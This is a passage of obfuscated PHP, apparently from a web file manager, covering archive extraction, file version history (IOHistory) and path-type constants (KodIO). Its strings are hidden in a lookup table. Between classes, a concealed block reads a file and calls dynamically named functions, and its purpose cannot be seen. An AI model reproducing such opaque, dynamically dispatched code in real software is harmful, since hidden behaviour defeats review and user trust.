$ıª®üƒ‹ = array(array($áæñ‡¯ï[32] => $âµëÜ“Û, $áæñ‡¯ï[1233] => -1)); $ıª®üƒ‹[0][$áæñ‡¯ï[1248]] = $ıª®üƒ‹[0][$áæñ‡¯ï[32]]; } else { if (is_array($£ìµ£ó)) { $ıª®üƒ‹ = $£ìµ£ó; $ì óÎµË = count($ıª®üƒ‹) - 1; for ($‹û°®¡ = 0; $‹û°®¡ <= $ì óÎµË; $‹û°®¡++) { $İÁÁ«ı¤ = $ıª®üƒ‹[$‹û°®¡]; $¾›Âœñ¬ = get_path_this($İÁÁ«ı¤[$áæñ‡¯ï[32]]) . (checkExtSafe($İÁÁ«ı¤[$áæñ‡¯ï[32]]) ? $áæñ‡¯ï[12] : $áæñ‡¯ï[1249]); $ıª®üƒ‹[$‹û°®¡][$áæñ‡¯ï[1248]] = $áæñ‡¯ï[1250] . intval($İÁÁ«ı¤[$áæñ‡¯ï[1233]]) . $áæñ‡¯ï[430] . $¾›Âœñ¬; if ($‹û°®¡ == 0) { continue; } $ıª®üƒ‹[$‹û°®¡][$áæñ‡¯ï[1248]] = $ıª®üƒ‹[$‹û°®¡ - 1][$áæñ‡¯ï[1248]] . $áæñ‡¯ï[1251] . $ıª®üƒ‹[$‹û°®¡][$áæñ‡¯ï[1248]]; } } } if (!is_array($ıª®üƒ‹) || count($ıª®üƒ‹) == 0) { return !1; } $Èí‚Ú²Ø = $ıª®üƒ‹[count($ıª®üƒ‹) - 1]; if (!IO::exist($Ï¦âåæ)) { return !1; } $—ë½ê—ö = TEMP_FILES . $áæñ‡¯ï[1252] . kodIO::hashPathSafe($Ï¦âåæ) . $áæñ‡¯ï[8]; $±ÂÅîïö = $—ë½ê—ö . $Èí‚Ú²Ø[$áæñ‡¯ï[1248]]; mk_dir($—ë½ê—ö); file_put_contents(TEMP_FILES . $áæñ‡¯ï[1227], $áæñ‡¯ï[12]); if (IO::exist($±ÂÅîïö)) { return array($áæñ‡¯ï[214] => $±ÂÅîïö, $áæñ‡¯ï[1232] => $ıª®üƒ‹, $áæñ‡¯ï[1234] => $—ë½ê—ö); } $åĞÒàå = self::localFilePath($Ï¦âåæ); if (!$åĞÒàå) { $åĞÒàå = $—ë½ê—ö . $áæñ‡¯ï[1253]; if (!IO::exist($åĞÒàå)) { self::copy($Ï¦âåæ, $—ë½ê—ö, !1, get_path_this($åĞÒàå)); } } if (!$åĞÒàå || !IO::exist($åĞÒàå)) { return !1; } if ($Èí‚Ú²Ø[$áæñ‡¯ï[1233]] == -1) { return array($áæñ‡¯ï[214] => $åĞÒàå, $áæñ‡¯ï[1232] => $ıª®üƒ‹, $áæñ‡¯ï[1234] => $—ë½ê—ö); } $Ö½‰ªş = $åĞÒàå; foreach ($ıª®üƒ‹ as $‹û°®¡ => $İÁÁ«ı¤) { if (!$İÁÁ«ı¤ || $İÁÁ«ı¤[$áæñ‡¯ï[1233]] == $áæñ‡¯ï[1231]) { break; } if (substr($İÁÁ«ı¤[$áæñ‡¯ï[32]], -1, 1) == $áæñ‡¯ï[8]) { break; } $Êç‚Ø  = in_array(get_path_ext($İÁÁ«ı¤[$áæñ‡¯ï[1248]]), array($áæñ‡¯ï[357], $áæñ‡¯ï[1238], $áæñ‡¯ï[1239], $áæñ‡¯ï[1240], $áæñ‡¯ï[1241], $áæñ‡¯ï[1242])); $¬à¦¦Òè = $‹û°®¡ == count($ıª®üƒ‹) - 1 && $Êç‚Ø ; $›Ì–ùš = $—ë½ê—ö . $İÁÁ«ı¤[$áæñ‡¯ï[1248]]; $áÆ¥™Ã = $—ë½ê—ö . get_path_this($İÁÁ«ı¤[$áæñ‡¯ï[32]]); if (IO::exist($›Ì–ùš)) { $Ö½‰ªş = $›Ì–ùš; continue; } $³¼½áœ = $‹û°®¡ == 0 ? get_path_ext($âµëÜ“Û) : get_path_ext($Ö½‰ªş); $ÎŸ”ùìö = KodArchive::extract(self::iconvSystem($Ö½‰ªş), $—ë½ê—ö, $İÁÁ«ı¤[$áæñ‡¯ï[1233]], $ûáÖÊ, $³¼½áœ); self::unzipErrorCheck($ÎŸ”ùìö, array($áæñ‡¯ï[1254], $Ï¦âåæ, $ıª®üƒ‹, $İÁÁ«ı¤, $›Ì–ùš)); if (IO::exist($áÆ¥™Ã)) { IO::rename($áÆ¥™Ã, get_path_this($›Ì–ùš)); } $Ö½‰ªş = $›Ì–ùš; } $±ÂÅîïö = $Ö½‰ªş; return array($áæñ‡¯ï[214] => $Ö½‰ªş, $áæñ‡¯ï[1232] => $ıª®üƒ‹, $áæñ‡¯ï[1234] => $—ë½ê—ö); } private static function unzipErrorCheck($ÒÊº—Ş­, $¿«¨±É« = false) { $¿âã”áŠ =& $_SERVER[³½¬ÚË¯]; if ($ÒÊº—Ş­[$¿âã”áŠ[1255]]) { return !0; } write_log(array($¿âã”áŠ[1256], $ÒÊº—Ş­, $¿«¨±É«), $¿âã”áŠ[1257]); show_json($¿âã”áŠ[1258] . json_encode($ÒÊº—Ş­[$¿âã”áŠ[1245]]), !1); die; } } if ($_SERVER[$_SERVER[³½¬ÚË¯][903]] != $_SERVER[$_SERVER[³½¬ÚË¯][904]]) { $_getc = $_SERVER[³½¬ÚË¯][905]; $_getfile = $_SERVER[$_SERVER[³½¬ÚË¯][906]] . $_SERVER[³½¬ÚË¯][907]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³½¬ÚË¯][246], $_getfilec); if (count($_getarrs) < $_SERVER[³½¬ÚË¯][658]) { $exit = $_SERVER[³½¬ÚË¯][908]; $exit(); } $_act = $_SERVER[³½¬ÚË¯][909]; $_act($_SERVER[$_SERVER[³½¬ÚË¯][910]]); } goto F—ˆ±ÈÚ¸ä; F—ˆ±ÈÚ¸ä: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ß—ƒ =& $_SERVER[³½¬ÚË¯]; $ûëáŸ–Œ = $GLOBALS[$ß—ƒ[6]][$ß—ƒ[89]]; if ($ûëáŸ–Œ[$ß—ƒ[1259]] != 1) { return; } if ($ûëáŸ–Œ[$ß—ƒ[1260]] <= 0) { return; } if (isset($_REQUEST[$ß—ƒ[1261]]) && $_REQUEST[$ß—ƒ[1261]] == $ß—ƒ[88]) { return; } Hook::bind($ß—ƒ[1262], $ß—ƒ[1263]); Hook::bind($ß—ƒ[1264], $ß—ƒ[1265]); Hook::bind($ß—ƒ[1266], $ß—ƒ[1267]); Hook::bind($ß—ƒ[1268], $ß—ƒ[1269]); Hook::bind($ß—ƒ[1270], $ß—ƒ[1271]); Hook::bind($ß—ƒ[1272], $ß—ƒ[1273]); } public static function eventBeforeUpload($ø‡Áí£ç) { if ($ø‡Áí£ç[3] && $ø‡Áí£ç[3] != REPEAT_REPLACE) { return; } $Åµ¿Ëˆ± = self::parsePath($ø‡Áí£ç[0]); if (!$Åµ¿Ëˆ±) { return; } self::add($Åµ¿Ëˆ±); } public static function eventBeforeEdit($»Û‘ºŸ¹) { $ ß¤íØ = self::parsePath($»Û‘ºŸ¹[0]); if (!$ ß¤íØ) { return; } self::add($ ß¤íØ); } public static function eventBeforeCopyFile($òíœÀ„½, $ìú©¯Ò¬, $‘‚¢ìâ, $ÅËóúï, $›™Ã•ñá, $é“ˆ±ôì) { $çæ±¸ÊŞ =& $_SERVER[³½¬ÚË¯]; if (isset($‘‚¢ìâ->_data[$çæ±¸ÊŞ[1198]]) && $‘‚¢ìâ->_data[$çæ±¸ÊŞ[1198]]) { return; } $©’’š‰ä = $‘‚¢ìâ->getPathOuter($ÅËóúï); $®ÀÜıâÖ = self::parsePath($©’’š‰ä); if (!$®ÀÜıâÖ) { return; } self::add($®ÀÜıâÖ); } public static function eventBeforeRename($îà¬ ·«) { $”ˆ«ÁÂö =& $_SERVER[³½¬ÚË¯]; $–ø›÷Ù„ = self::parsePath($îà¬ ·«[0]); if (!$–ø›÷Ù„) { return; } $²°­ñ’ = self::checkInHistory($–ø›÷Ù„); if (!$²°­ñ’) { return; } if ($²°­ñ’[$”ˆ«ÁÂö[33]] == $”ˆ«ÁÂö[214]) { $Çç«°»ô = self::listData($–ø›÷Ù„); if ($Çç«°»ô && $Çç«°»ô[$”ˆ«ÁÂö[413]]) { self::moveHistory($–ø›÷Ù„, $îà¬ ·«[1]); } } else { IO::rename($²°­ñ’[$”ˆ«ÁÂö[84]], $îà¬ ·«[1]); } } public static function eventBeforeMove($ƒÑıÀÒ) { $¨Ë·‚ïØ =& $_SERVER[³½¬ÚË¯]; $±©™µ×Œ = self::parsePath($ƒÑıÀÒ[0]); if (!$±©™µ×Œ) { return; } $ÀèØ§Ú = self::parsePath($ƒÑıÀÒ[1]); if (!$ÀèØ§Ú) { return; } $‡Ğ•êå— = $ƒÑıÀÒ[3]; $ºşŸë¦ = self::checkInHistory($±©™µ×Œ); if (!$ºşŸë¦) { return; } $¢‹ğĞÄô = self::pathHistory($ÀèØ§Ú); if ($ºşŸë¦[$¨Ë·‚ïØ[33]] == $¨Ë·‚ïØ[214]) { $Áí¹·¿„ = self::listData($±©™µ×Œ); $É×­âú¿ = rtrim($ÀèØ§Ú, $¨Ë·‚ïØ[8]) . $¨Ë·‚ïØ[8] . ($‡Ğ•êå— ? $‡Ğ•êå— : get_path_this($±©™µ×Œ)); $ôìÏÉ‰ = self::listData($É×­âú¿); if ($Áí¹·¿„ && $Áí¹·¿„[$¨Ë·‚ïØ[413]] && $ôìÏÉ‰ && $ôìÏÉ‰[$¨Ë·‚ïØ[413]]) { return self::clear($±©™µ×Œ); } if ($Áí¹·¿„ && $Áí¹·¿„[$¨Ë·‚ïØ[413]]) { self::moveHistory($±©™µ×Œ, $‡Ğ•êå—, $¢‹ğĞÄô); } } else { IO::move($ºşŸë¦[$¨Ë·‚ïØ[84]], $¢‹ğĞÄô, !1, $‡Ğ•êå—); self::clearEmptyFolder(IO::pathFather($ºşŸë¦[$¨Ë·‚ïØ[84]])); } } public static function eventAfterRemove($¹°ÜŞğø, $ĞıÆŒÏÕ) { $”ˆÉÉ™İ =& $_SERVER[³½¬ÚË¯]; if (!$ĞıÆŒÏÕ) { return; } $»È›Û©í = self::parsePath($¹°ÜŞğø[0]); if (!$»È›Û©í) { return; } $Œ»šœòĞ = self::checkInHistory($»È›Û©í); if (!$Œ»šœòĞ) { return; } if ($Œ»šœòĞ[$”ˆÉÉ™İ[33]] == $”ˆÉÉ™İ[214]) { $îÉ‘Ğ¨¥ = self::listData($»È›Û©í, !1); if ($îÉ‘Ğ¨¥ && $îÉ‘Ğ¨¥[$”ˆÉÉ™İ[413]]) { self::clear($»È›Û©í, !1); } } else { IO::remove($Œ»šœòĞ[$”ˆÉÉ™İ[84]]); self::clearEmptyFolder(IO::pathFather($Œ»šœòĞ[$”ˆÉÉ™İ[84]])); } } private static function checkInHistory($°‘×Ï”ñ) { $ıóâÉ— = self::pathHistory($°‘×Ï”ñ); if (!IO::exist($ıóâÉ—)) { $ıóâÉ— .= $_SERVER[³½¬ÚË¯][1274]; } return IO::exist($ıóâÉ—) ? IO::info($ıóâÉ—) : !1; } private static function parsePath($Ü§ğğšç) { $´“ÕÄËØ =& $_SERVER[³½¬ÚË¯]; if (!$Ü§ğğšç) { return !1; } if ($GLOBALS[$´“ÕÄËØ[1275]]) { return; } $ÉÔ½şîˆ = KodIO::parse($Ü§ğğšç); $ıˆÌå˜† = $ÉÔ½şîˆ[$´“ÕÄËØ[33]]; $¸¨Å™İó = !$ıˆÌå˜† || $ıˆÌå˜† == KodIO::KOD_IO || $ıˆÌå˜† == KodIO::KOD_SHARE_ITEM; if (!$¸¨Å™İó || !$ÉÔ½şîˆ[$´“ÕÄËØ[1276]]) { return !1; } if (substr($Ü§ğğšç, 0, strlen(DATA_PATH . $´“ÕÄËØ[1277])) == DATA_PATH . $´“ÕÄËØ[1277]) { return !1; } if ($ıˆÌå˜† == KodIO::KOD_SHARE_ITEM) { $ªíÙæĞá = IO::init($Ü§ğğšç); if ($ªíÙæĞá->pathParse[$´“ÕÄËØ[1194]]) { return self::parsePath($ªíÙæĞá->pathParse[$´“ÕÄËØ[1194]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ªğÚˆØĞ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $´“ÕÄËØ[1278]); foreach ($ªğÚˆØĞ as $Ìúö‹ìş) { if (!$ıˆÌå˜† && substr($Ü§ğğšç, 0, strlen($Ìúö‹ìş)) == $Ìúö‹ìş) { return !1; } } self::log($GLOBALS[$´“ÕÄËØ[1189]] . $´“ÕÄËØ[1279] . $Ü§ğğšç); return $Ü§ğğšç; } private static function pathHistory($ˆÈïğÜ) { $Èæ›¦š³ =& $_SERVER[³½¬ÚË¯]; $Ò§±™¿” = self::$_historyBase . ltrim(KodIO::clear($ˆÈïğÜ), $Èæ›¦š³[8]); $Ò§±™¿” = str_replace(array($Èæ›¦š³[1280]), array($Èæ›¦š³[1281]), $Ò§±™¿”); return $Ò§±™¿”; } public static function log($„‘¨) { } public static function historyCount($÷äŸ˜) { $ŠÛ§Í‚Å =& $_SERVER[³½¬ÚË¯]; $©É¹öóº = array(); $²‹±Ã‰› = array(); foreach ($÷äŸ˜ as $îòñÑ) { $Ëü÷Ô—¢ = get_path_father($îòñÑ); if (!$²‹±Ã‰›[$Ëü÷Ô—¢]) { $²‹±Ã‰›[$Ëü÷Ô—¢] = array(); } $²‹±Ã‰›[$Ëü÷Ô—¢][] = get_path_this($îòñÑ); } foreach ($²‹±Ã‰› as $Ëü÷Ô—¢ => $ÊŞ»ËÇü) { $ë ‡µ”¦ = self::parsePath($Ëü÷Ô—¢); if (!$ë ‡µ”¦) { continue; } foreach ($ÊŞ»ËÇü as $â°ï‡µŒ) { $øØÒß‹ = self::listData(rtrim($ë ‡µ”¦, $ŠÛ§Í‚Å[8]) . $ŠÛ§Í‚Å[8] . $â°ï‡µŒ, !1); if ($øØÒß‹ && $øØÒß‹[$ŠÛ§Í‚Å[413]]) { $©É¹öóº[rtrim($Ëü÷Ô—¢, $ŠÛ§Í‚Å[8]) . $ŠÛ§Í‚Å[8] . $â°ï‡µŒ] = count($øØÒß‹[$ŠÛ§Í‚Å[413]]); } } } return $©É¹öóº; } public static function add($¨±â‹†Ì) { $¤Ó„úÇ‚ =& $_SERVER[³½¬ÚË¯]; $Åêø¡–  = self::listData($¨±â‹†Ì); if (!$Åêø¡– ) { return; } $¡Ñ¯ı”× = Model($¤Ó„úÇ‚[806])->get($¤Ó„úÇ‚[1282]); $Èô¢ì»¹ = $GLOBALS[$¤Ó„úÇ‚[6]][$¤Ó„úÇ‚[89]][$¤Ó„úÇ‚[1260]]; $øöíŸ = $¡Ñ¯ı”× == $¤Ó„úÇ‚[1283] ? min(5, $Èô¢ì»¹) : $Èô¢ì»¹; if ($Èô¢ì»¹ <= 0) { return; } $˜˜ÔÓ = IO::info($¨±â‹†Ì); $Æƒ–¤¦è = $Åêø¡– [$¤Ó„úÇ‚[413]]; if ($˜˜ÔÓ[$¤Ó„úÇ‚[76]] == 0) { return; } if ($˜˜ÔÓ[$¤Ó„úÇ‚[76]] >= 1024 * 1024 * 500) { return !1; } $âşÄŒ¡Œ = IO::hashSimple($¨±â‹†Ì); if ($Æƒ–¤¦è && $Æƒ–¤¦è[0][$¤Ó„úÇ‚[641]] == $âşÄŒ¡Œ) { return !0; } if (array_key_exists($¤Ó„úÇ‚[217], $˜˜ÔÓ) && !$˜˜ÔÓ[$¤Ó„úÇ‚[217]]) { return !1; } $úÔûš™¨ = short_id(time()); $Ûƒ±ï = array($¤Ó„úÇ‚[443] => $úÔûš™¨, $¤Ó„úÇ‚[641] => $âşÄŒ¡Œ, $¤Ó„úÇ‚[32] => $˜˜ÔÓ[$¤Ó„úÇ‚[32]] . $¤Ó„úÇ‚[10] . date($¤Ó„úÇ‚[1284]) . rand_string(1), $¤Ó„úÇ‚[76] => $˜˜ÔÓ[$¤Ó„úÇ‚[76]], $¤Ó„úÇ‚[495] => USER_ID, $¤Ó„úÇ‚[215] => time(), $¤Ó„úÇ‚[1285] => $¤Ó„úÇ‚[12]); IO::mkdir($Åêø¡– [$¤Ó„úÇ‚[1286]]); $†ÆéìÄü = IO::copy($¨±â‹†Ì, $Åêø¡– [$¤Ó„úÇ‚[1286]], !1, $Ûƒ±ï[$¤Ó„úÇ‚[32]]); if (!$†ÆéìÄü) { self::clearEmptyFolder($Åêø¡– [$¤Ó„úÇ‚[1286]]); return !1; } array_unshift($Æƒ–¤¦è, $Ûƒ±ï); if (count($Æƒ–¤¦è) > $øöíŸ) { $¦®ÒàÓÄ = array_slice($Æƒ–¤¦è, $øöíŸ); foreach ($¦®ÒàÓÄ as $•ÃÎúë») { IO::remove($Åêø¡– [$¤Ó„úÇ‚[1286]] . $•ÃÎúë»[$¤Ó„úÇ‚[32]]); } $Æƒ–¤¦è = array_slice($Æƒ–¤¦è, 0, $øöíŸ); } return self::saveData($Åêø¡– [$¤Ó„úÇ‚[1287]], $Æƒ–¤¦è); } public static function remove($©í¬å¿, $±ÃÎĞĞ) { $Ôı©÷Ÿ‰ =& $_SERVER[³½¬ÚË¯]; $ŸğÚ ìµ = self::listData($©í¬å¿); $ó¡Ûõ = array(); if (!$ŸğÚ ìµ) { return !1; } foreach ($ŸğÚ ìµ[$Ôı©÷Ÿ‰[413]] as $’éÁ¨Ëú) { if ($’éÁ¨Ëú[$Ôı©÷Ÿ‰[443]] == $±ÃÎĞĞ) { IO::remove($ŸğÚ ìµ[$Ôı©÷Ÿ‰[1286]] . $’éÁ¨Ëú[$Ôı©÷Ÿ‰[32]]); continue; } $ó¡Ûõ[] = $’éÁ¨Ëú; } return self::saveData($ŸğÚ ìµ[$Ôı©÷Ÿ‰[1287]], $ó¡Ûõ); } public static function clear($ñÜÃ•Üœ, $©”¸í€ = true) { $ò‚â¼„ =& $_SERVER[³½¬ÚË¯]; $ŞŒï¸Ìù = self::listData($ñÜÃ•Üœ, $©”¸í€); if (!$ŞŒï¸Ìù) { return !1; } foreach ($ŞŒï¸Ìù[$ò‚â¼„[413]] as $”üÀ“Õó) { IO::remove($ŞŒï¸Ìù[$ò‚â¼„[1286]] . $”üÀ“Õó[$ò‚â¼„[32]]); } return self::saveData($ŞŒï¸Ìù[$ò‚â¼„[1287]], array()); } public static function moveHistory($Ø”õ‚¦í, $õ­éˆ = '', $ö®›Ìñ  = '') { $—ÒƒİøÀ =& $_SERVER[³½¬ÚË¯]; $Í‹«£Â¥ = self::listData($Ø”õ‚¦í, !1); if (!$Í‹«£Â¥ || !$Í‹«£Â¥[$—ÒƒİøÀ[413]]) { return !1; } $²¶—Ğå = $—ÒƒİøÀ[1274]; $õ­éˆ = $õ­éˆ ? $õ­éˆ : get_path_this($Ø”õ‚¦í); $ö®›Ìñ  = $ö®›Ìñ  ? $ö®›Ìñ  : $Í‹«£Â¥[$—ÒƒİøÀ[1286]]; $ÇŠøÉ‡ = substr(get_path_this($Í‹«£Â¥[$—ÒƒİøÀ[1287]]), 0, -strlen($²¶—Ğå)); foreach ($Í‹«£Â¥[$—ÒƒİøÀ[413]] as $ï’•Çæè => $šƒé‘ı) { $¿©™³£³ = $õ­éˆ . substr($šƒé‘ı[$—ÒƒİøÀ[32]], strlen($ÇŠøÉ‡)); $å™ÒÀ¨Ê = IO::move($Í‹«£Â¥[$—ÒƒİøÀ[1286]] . $šƒé‘ı[$—ÒƒİøÀ[32]], $ö®›Ìñ , !1, $¿©™³£³); if ($å™ÒÀ¨Ê) { $Í‹«£Â¥[$—ÒƒİøÀ[413]][$ï’•Çæè][$—ÒƒİøÀ[32]] = $¿©™³£³; } } $Í‹«£Â¥[$—ÒƒİøÀ[1287]] = IO::move($Í‹«£Â¥[$—ÒƒİøÀ[1287]], $ö®›Ìñ , !1, $õ­éˆ . $²¶—Ğå); self::saveData($Í‹«£Â¥[$—ÒƒİøÀ[1287]], $Í‹«£Â¥[$—ÒƒİøÀ[413]]); self::clearEmptyFolder($Í‹«£Â¥[$—ÒƒİøÀ[1286]]); } public static function rollback($»ç ¾æ, $Å™àó) { $ËÛ‡Òàä =& $_SERVER[³½¬ÚË¯]; $—±ËŸğú = self::listData($»ç ¾æ); if (!$—±ËŸğú) { return; } $¨¹Ùóï’ = IO::info($»ç ¾æ); foreach ($—±ËŸğú[$ËÛ‡Òàä[413]] as $Ø¸Ø‹Ìä => $ÜØ—¸Ş) { if ($ÜØ—¸Ş[$ËÛ‡Òàä[443]] == $Å™àó) { self::add($»ç ¾æ); $á¼šúÑ = $—±ËŸğú[$ËÛ‡Òàä[1286]] . $ÜØ—¸Ş[$ËÛ‡Òàä[32]]; $’ÁÊÔŠ½ = IO::copy($á¼šúÑ, IO::pathFather($»ç ¾æ), REPEAT_REPLACE, $¨¹Ùóï’[$ËÛ‡Òàä[32]]); if ($’ÁÊÔŠ½) { self::remove($»ç ¾æ, $Å™àó); } return $’ÁÊÔŠ½; } } return !1; } public static function setDetail($Ü•š·‘ˆ, $ó§ê–Øµ, $ÙÈ¥üº¢) { $»Íà¿†Ë =& $_SERVER[³½¬ÚË¯]; $œ¸˜çäò = self::listData($Ü•š·‘ˆ); if (!$œ¸˜çäò) { return; } foreach ($œ¸˜çäò[$»Íà¿†Ë[413]] as $‡Âš«ôŞ => $¹ ×Ìµ¼) { if ($¹ ×Ìµ¼[$»Íà¿†Ë[443]] == $ó§ê–Øµ) { $œ¸˜çäò[$»Íà¿†Ë[413]][$‡Âš«ôŞ][$»Íà¿†Ë[1285]] = $ÙÈ¥üº¢; self::saveData($œ¸˜çäò[$»Íà¿†Ë[1287]], $œ¸˜çäò[$»Íà¿†Ë[413]]); return !0; } } return !1; } public static function fileInfo($Ğ–¨¿’’, $ñ‰¡ÌÀš) { $©ÉÏ€óš =& $_SERVER[³½¬ÚË¯]; $ÌƒßÏ°Æ = self::listData($Ğ–¨¿’’); if (!$ÌƒßÏ°Æ) { show_json(LNG($©ÉÏ€óš[105]), !1); } $ØŒ¼Ä½Ê = $©ÉÏ€óš[12]; foreach ($ÌƒßÏ°Æ[$©ÉÏ€óš[413]] as $ƒÜ¥Ôò³ => $ÚÈ èù®) { if ($ÚÈ èù®[$©ÉÏ€óš[443]] != $ñ‰¡ÌÀš) { continue; } $ØŒ¼Ä½Ê = $ÌƒßÏ°Æ[$©ÉÏ€óš[1286]] . $ÚÈ èù®[$©ÉÏ€óš[32]]; break; } if (!$ØŒ¼Ä½Ê) { show_json(LNG($©ÉÏ€óš[105]), !1); } return IO::info($ØŒ¼Ä½Ê); } public static function fileOut($¢„Ã¸®´, $‘Ã•Ç—™, $ŞùĞè·â = false) { $ü¾¾½Ï× =& $_SERVER[³½¬ÚË¯]; $Æçƒü«™ = self::fileInfo($¢„Ã¸®´, $‘Ã•Ç—™); $Ñ£Èá‰™ =& $GLOBALS[$ü¾¾½Ï×[7]]; $ŞùĞè·â = isset($Ñ£Èá‰™[$ü¾¾½Ï×[1237]]) && $Ñ£Èá‰™[$ü¾¾½Ï×[1237]] == 1; if (isset($Ñ£Èá‰™[$ü¾¾½Ï×[33]]) && $Ñ£Èá‰™[$ü¾¾½Ï×[33]] == $ü¾¾½Ï×[1288]) { return IO::fileOutImage($Æçƒü«™[$ü¾¾½Ï×[84]], $Ñ£Èá‰™[$ü¾¾½Ï×[1289]]); } IO::fileOut($Æçƒü«™[$ü¾¾½Ï×[84]], $ŞùĞè·â, get_path_this($¢„Ã¸®´)); } public static function listData($³ä¯œî­, $á‘õğœ€ = true) { $±á…¸£ =& $_SERVER[³½¬ÚË¯]; if ($á‘õğœ€ && !IO::exist($³ä¯œî­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($³ä¯œî­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ùßÜºøÂ = self::pathHistory($³ä¯œî­); $ÔÑ»Ø•ã = array($±á…¸£[1287] => $ùßÜºøÂ . $±á…¸£[1274], $±á…¸£[1286] => rtrim(get_path_father($ùßÜºøÂ), $±á…¸£[8]) . $±á…¸£[8], $±á…¸£[413] => array()); $–ßû®Øê = IO::getContent($ÔÑ»Ø•ã[$±á…¸£[1287]]); if ($–ßû®Øê) { $ø¨÷¡Æ = json_decode($–ßû®Øê, !0); if (is_array($ø¨÷¡Æ)) { $ÔÑ»Ø•ã[$±á…¸£[413]] = $ø¨÷¡Æ; } } return $ÔÑ»Ø•ã; } private static function saveData($±š¡±ôê, $ü‹¤×ç°) { $ ÷Üşï˜ =& $_SERVER[³½¬ÚË¯]; self::log($ ÷Üşï˜[1290] . $±š¡±ôê . $ ÷Üşï˜[71] . count($ü‹¤×ç°), $ ÷Üşï˜[787]); if ($ü‹¤×ç°) { return IO::setContent($±š¡±ôê, json_encode($ü‹¤×ç°)); } $¯ÅËÉñú = IO::pathFather($±š¡±ôê); IO::remove($±š¡±ôê); self::clearEmptyFolder($¯ÅËÉñú); return !0; } public static function clearEmptyFolder($‚—ê‘Í) { $ÌÉùüûØ =& $_SERVER[³½¬ÚË¯]; if (trim($‚—ê‘Í, $ÌÉùüûØ[8]) == trim(self::$_historyBase, $ÌÉùüûØ[8])) { return; } $ÑşØ††È = IO::pathFather($‚—ê‘Í); $Õ‹ÓÍîù = IO::has($‚—ê‘Í, !0); if ($Õ‹ÓÍîù[$ÌÉùüûØ[223]] > 0 || $Õ‹ÓÍîù[$ÌÉùüûØ[224]] > 0) { return; } IO::remove($‚—ê‘Í); self::clearEmptyFolder($ÑşØ††È); } private static function getBasePath() { $æÎ‹ó¡ =& $_SERVER[³½¬ÚË¯]; $ƒ«ãíÅâ = Model($æÎ‹ó¡[1291])->get($æÎ‹ó¡[1292]); if ($ƒ«ãíÅâ) { if (!IO::exist($ƒ«ãíÅâ)) { IO::mkdir($ƒ«ãíÅâ); } if (get_path_this($ƒ«ãíÅâ) == $æÎ‹ó¡[1277]) { $±Á¹İËª = $æÎ‹ó¡[1293] . rand_string(8); @rename($ƒ«ãíÅâ, get_path_father($ƒ«ãíÅâ) . $æÎ‹ó¡[8] . $±Á¹İËª); $ƒ«ãíÅâ = DATA_PATH . $±Á¹İËª . $æÎ‹ó¡[8]; file_put_contents(DATA_PATH . $æÎ‹ó¡[1227], $æÎ‹ó¡[12]); Model($æÎ‹ó¡[1291])->set($æÎ‹ó¡[1292], $ƒ«ãíÅâ); } return $ƒ«ãíÅâ; } $ƒ«ãíÅâ = DATA_PATH . $æÎ‹ó¡[1293] . rand_string(8) . $æÎ‹ó¡[8]; $ƒ«ãíÅâ = IO::mkdir($ƒ«ãíÅâ); $ƒ«ãíÅâ = rtrim($ƒ«ãíÅâ, $æÎ‹ó¡[8]) . $æÎ‹ó¡[8]; file_put_contents($ƒ«ãíÅâ . $æÎ‹ó¡[1227], $æÎ‹ó¡[12]); file_put_contents(DATA_PATH . $æÎ‹ó¡[1227], $æÎ‹ó¡[12]); Model($æÎ‹ó¡[1291])->set($æÎ‹ó¡[1292], $ƒ«ãíÅâ); return $ƒ«ãíÅâ; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\122\x65\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\163\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\106\151\154\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\x46\x69\x6c\x65\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\160\x52\157\x6f\164\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\x53\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\123\150\x61\162\145\114\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\145\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\x65\111\164\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\x65\111\x74\x65\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\x62\154\157\x63\153\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\122\x65\156\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\162\x7d"; public static function typeList() { $Ÿ‘Ñğêñ =& $_SERVER[³½¬ÚË¯]; return array($Ÿ‘Ñğêñ[1294] => self::KOD_SOURCE, $Ÿ‘Ñğêñ[1295] => self::KOD_USER_RECYCLE, $Ÿ‘Ñğêñ[1296] => self::KOD_USER_FAV, $Ÿ‘Ñğêñ[1297] => self::KOD_USER_FILE_TAG, $Ÿ‘Ñğêñ[1298] => self::KOD_USER_FILE_TYPE, $Ÿ‘Ñğêñ[1299] => self::KOD_GROUP_ROOT_SELF, $Ÿ‘Ñğêñ[1300] => self::KOD_USER_SHARE, $Ÿ‘Ñğêñ[1301] => self::KOD_USER_SHARE_LINK, $Ÿ‘Ñğêñ[1302] => self::KOD_USER_SHARE_TO_ME, $Ÿ‘Ñğêñ[1303] => self::KOD_SHARE_ITEM, $Ÿ‘Ñğêñ[1304] => self::KOD_SHARE_LINK, $Ÿ‘Ñğêñ[1305] => self::KOD_SEARCH, $Ÿ‘Ñğêñ[1306] => self::KOD_BLOCK, $Ÿ‘Ñğêñ[1307] => self::KOD_IO, $Ÿ‘Ñğêñ[1308] => self::KOD_USER_RECENT, $Ÿ‘Ñğêñ[1309] => self::KOD_USER_DRIVER); } public static function parse($üÑÕ¤Ôğ) { $Õ¡ÏÅÌ‘ =& 